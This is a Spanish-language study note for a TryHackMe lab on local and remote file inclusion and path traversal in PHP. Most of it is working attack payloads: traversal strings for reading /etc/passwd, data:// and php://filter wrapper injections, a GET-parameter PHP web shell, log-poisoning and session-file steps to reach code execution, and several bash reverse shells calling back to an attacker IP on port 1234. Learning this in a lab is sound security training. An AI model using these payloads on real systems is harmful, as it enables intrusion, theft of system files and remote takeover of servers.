#lfi 


https://tryhackme.com/r/room/filepathtraversal

# File Inclusion, Path Traversal


## Task 1 Introduction

- que es FI , LFI y RFI
- que es Path Trasversal

## Task 2 Web Application Architecture

- que es Frontend
- que es Backend
- Server-Side Scripting and File Handling



LFI Interesting Files
https://github.com/ricew4ng/Blasting-Dictionary/blob/master/LFI-Interesting-Files%EF%BC%88249%EF%BC%89.txt

.htaccess

/etc/passwd
/etc/hosts
/etc/group

/etc/apache2/apache2.conf
/var/log/apache2/access.log
/etc/mysql/my.cnf


## Task 3 File Inclusion Types

### Sobre las rutas

#### Cadenas que atraviesan directorios

- explicar ../ para moverse atraves de los directorios
- se utilizan cadenas de transversal par allegar al directorio que se quiere
#### Rutas relativas
- Localizar un archivo basado en el directorio actual ./folder/file, que es el directorio donde se ejecuta el script
#### Rutas absolutas
- Especifica la ruta completa desde el directorio raiz : /var/www/html/folder/file.php 


### Tipos de inclusión de archivos

#### Local File Inclusion (LFI)
- El atacante explota una entrada sin sanitizar para acceder archivos fuera del directorio inicial, usando cadenas traslversal ../ hasta llegar al punto deseado
`include.php?page=../../../../etc/passwd`
- Se puede llegar a RCE cuando se inyecta codigo, luego se usa LFI para ejecutarlo : log poisoning

#### Ejemplos Local
```
/etc/passwd
/var/log/apache2/access.log
```



#### Remote File Inclusion (RFI)
- Incluir archivos remotos, en una entrada no validada manipulando la ruta
- Se pueden ejecutar scripts no deseados en el 


#### Ejemplos Remoto

```
 python3 -m http.server 80

http://10.6.34.162/file

x.php
<?php phpinfo(); ?>
<?php echo exec('whoami'); ?>
<?php shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/10.6.34.162/1234 0>&1'"); ?>


```


## Task 4 PHP Wrappers

- que son los php Wrappers

#### php://filter/
- Convierte el flujo de datos a diferentes formatos

| Filtros                                               |
| ----------------------------------------------------- |
| php://filter/convert.base64-encode/resource=.htaccess |
| php://filter/string.rot13/resource=.htaccess          |
#### data://
- integra datos en linea al flujo de datos
- `data:text/plain,<?php%20phpinfo();%20?>`
- http://10.10.119.58/playground.php?page=data:text/plain,%3C?php%20phpinfo();%20?%3E

```
data:text/plain,<?php phpinfo(); ?>
data:text/plain,<?php echo exec('whoami'); ?>

data:text/plain,<?php shell_exec("/bin/bash -c 'bash -i >%26 /dev/tcp/10.6.34.162/1234 0>%261'"); ?>


data:text/plain,<?php shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/10.6.34.162/1234 0>&1'"); ?>
```
 
## Task 5 Base Directory Breakouts
- Aveces hay medidas de protección evitar el path trasversal y por ende el LFI a otros archivos del sistema local
- Podemos evadir
- 
 
```
../../etc/passwd
../../../etc/passwd
/var/www/html/../../etc/passwd
/var/www/html/../../etc/passwd
/var/www/html/../../../etc/passwd
ok
/var/www/html/..//..//..//etc/passwd
```


## Task 6 LFI2 RCE - Session Files
- Los archivos de session en PHP pueden permitir LFI, manipulando los datos de sesión

#### Como trabaja
- iremos al endpoint de sesión: http://10.10.166.18/sessions.php
- inyectamos código : <?php echo phpinfo(); ?>
	- http://10.10.166.18/sessions.php?page=%3C%3Fphp+echo+phpinfo%28%29%3B+%3F%3E
- luego vamos a ver los cookies para traer el id de sesion y con lfi lo mandamos llamar
	- /var/lib/php/sessions/sess_uggbbq21qsb5n8dl1uojg1igj9
	- http://10.10.166.18/sessions.php?page=/var/lib/php/sessions/sess_uggbbq21qsb5n8dl1uojg1igj9
-
### Task 7 LFI2RCE - Log Poisoning

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

#### Como trabaja
- conectamos por netcat al puerto 80 y enviamos codigo



```
nc 10.10.166.18 80
<?php echo phpinfo(); ?>
HTTP/1.1 400 Bad Request
```

o 

```
<?php system($_GET['cmd']); ?>
```
- luego accedemos a los logs


http://10.10.19.119/playground.php
../../../var/log/apache2/access.log

http://10.10.166.18/playground.php?page=%2Fvar%2Flog%2Fapache2%2Faccess.log

### Task 8 LFI2RCE - Wrappers
- Los Wrappers de PHP permiten tambien ejecutar codigo remoto
- Se pude usar el wrapper php://filter, codificado en base 63
#### Como trabaja
- Inyectar desde el url (no cuadro de texto)> http://10.10.166.18/playground.php
- cadena original a inyectar
```
<?php system($_GET['cmd']); echo 'Shell done!'; ?>
```


```
php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=whoami
```
	- queda > http://10.10.166.18/playground.php?page=php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=whoami



#### Se puede tener reverse shell 

```
php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=/bin/bash -c 'bash -i > /dev/tcp/10.6.34.162/1234 0>%261'
```

```
/bin/bash -c 'bash -i >%26 /dev/tcp/10.6.34.162/1234 0>%261'
```
## Referencias


- ref1 >https://medium.com/@josewice7/lfi-to-rce-via-log-poisoning-db3e0e7a1cf1
- ref2 > https://dheerajdeshmukh.medium.com/get-reverse-shell-through-log-poisoning-with-the-vulnerability-of-lfi-local-file-inclusion-e504e2d41f69

